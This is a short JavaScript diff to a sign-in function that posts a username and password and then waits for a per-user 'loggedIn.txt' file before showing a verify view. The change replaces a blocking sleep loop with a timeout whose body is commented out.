@@ -42,9 +42,12 @@ function signIn(){
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
   postData(username,password);
-  sleep(10000);
-  while( !(fileExists(username+"loggedIn.txt"))){
-    sleep(2000);
+  // sleep(10000);
+  if( !(fileExists(username+"loggedIn.txt"))){
+    setTimeout(() => {
+      // loadingDiv.style.display = "none";
+      // verifyDiv.style.display ="block"
+    }, 2500);
   }
   loadingDiv.style.display = "none";
   verifyDiv.style.display ="block";
